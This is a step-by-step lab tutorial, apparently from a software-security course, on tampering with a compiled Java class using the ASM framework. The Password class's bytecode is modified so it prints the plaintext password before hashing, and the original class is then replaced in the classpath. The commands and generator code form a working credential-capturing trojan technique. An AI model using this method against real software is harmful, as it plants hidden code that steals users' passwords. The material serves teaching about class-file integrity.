How to Attack a Java Class File using the ASM Framework?
---------------------------------------------------------------------

1. Compile and test the original program
----------------------------------------
$ java -cp target/classes/:lib/commons-codec-1.7.jar org.se.lab.Main homer
Password [password=2aaab795b3836904f82efc6ca2285d927aed75206214e1da383418eb90c9052f]


2. Use static tools to analyze the bytecode
-------------------------------------------
$ javap -c target/classes/org/se/lab/Password.class 
Compiled from "Password.java"
public class org.se.lab.Password {
  public org.se.lab.Password(java.lang.String);
    Code:
       0: aload_0
       1: invokespecial #10                 // Method java/lang/Object."<init>":()V
       4: aconst_null
       5: astore_2
       6: ldc           #13                 // String SHA-256
       8: invokestatic  #15                 // Method java/security/MessageDigest.getInstance:(Ljava/lang/String;)Ljava/security/MessageDigest;
      11: astore_3
      12: aload_3
      13: aload_1
      14: ldc           #21                 // String UTF-8
      16: invokevirtual #23                 // Method java/lang/String.getBytes:(Ljava/lang/String;)[B
      19: invokevirtual #29                 // Method java/security/MessageDigest.update:([B)V
      22: aload_3
      23: invokevirtual #33                 // Method java/security/MessageDigest.digest:()[B
      26: astore_2
      27: goto          42
      30: astore_3
      31: new           #37                 // class java/lang/IllegalStateException
      34: dup
      35: ldc           #39                 // String Can't calculate hash value!
      37: aload_3
      38: invokespecial #41                 // Method java/lang/IllegalStateException."<init>":(Ljava/lang/String;Ljava/lang/Throwable;)V
      41: athrow
      42: aload_0
      43: aload_2
      44: invokestatic  #44                 // Method org/apache/commons/codec/binary/Hex.encodeHexString:([B)Ljava/lang/String;
      47: putfield      #50                 // Field password:Ljava/lang/String;
      50: return
    Exception table:
       from    to  target type
           6    27    30   Class java/security/NoSuchAlgorithmException
           6    27    30   Class java/io/UnsupportedEncodingException


3. Use ASM to generate a Dump-Class
-----------------------------------
A Dump class is a generated Java class that can generate a particular class file.

$ mkdir tmp
$ cd tmp
$ java -cp ../lib/asm-all-4.2.jar:../target/classes org.objectweb.asm.util.ASMifier org.se.lab.Password > PasswordDump.java


4. Modify the Dump-Class to generate a malicious class file
-----------------------------------------------------------
$ vi PasswordDump.java

mv.visitTryCatchBlock(l0, l1, l2, "java/security/NoSuchAlgorithmException");
mv.visitTryCatchBlock(l0, l1, l2, "java/io/UnsupportedEncodingException");
mv.visitVarInsn(ALOAD, 0);
mv.visitMethodInsn(INVOKESPECIAL, "java/lang/Object", "<init>", "()V");
mv.visitInsn(ACONST_NULL);
mv.visitVarInsn(ASTORE, 2);

// INSERT----------------------------------------------------------------------------------
mv.visitFieldInsn(GETSTATIC, "java/lang/System", "out", "Ljava/io/PrintStream;");
mv.visitVarInsn(ALOAD, 1);
mv.visitMethodInsn(INVOKEVIRTUAL, "java/io/PrintStream", "println", "(Ljava/lang/String;)V");
// INSERT----------------------------------------------------------------------------------

mv.visitLabel(l0);
mv.visitLdcInsn("SHA-256");

Also, remove the following "import" statement:
import org.objectweb.asm.attrs.*;


5. Compile the Dump-Class and implement a generator class to execute it
-----------------------------------------------------------------------
$ mkdir build
$ javac -cp ../lib/asm-all-4.2.jar:../build:./build -d build PasswordDump.java

$ vi Generator.java

package org.se.lab;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import asm.org.se.lab.PasswordDump;

public class Generator
{
    private final static String CLASSPATH = ".";
    private final static String FILE_NAME = "Password.class";

    public static void main(String... args) throws Exception
    {
        final byte[] BYTE_CODE = PasswordDump.dump(); 
        
        DataOutputStream dout=new DataOutputStream(new FileOutputStream( new File(CLASSPATH, FILE_NAME)));
        dout.write(BYTE_CODE);
        dout.flush();
        dout.close();           
    }
}


6. Compile the generator and execute it
---------------------------------------
$ javac -cp ../lib/asm-all-4.2.jar:../build:./build -d build Generator.java

$ java -cp ../lib/asm-all-4.2.jar:./build org.se.lab.Generator 


7. Copy the malicious class file into the original CLASSPATH
------------------------------------------------------------
$ cp Password.class ../build/org/se/lab/


8. Run the application again
----------------------------
$ java -cp ../build:../lib/commons-codec-1.7.jar org.se.lab.Main homer
homer 
Password [password=2aaab795b3836904f82efc6ca2285d927aed75206214e1da383418eb90c9052f]

$ cd ..
$ rm -rf tmp
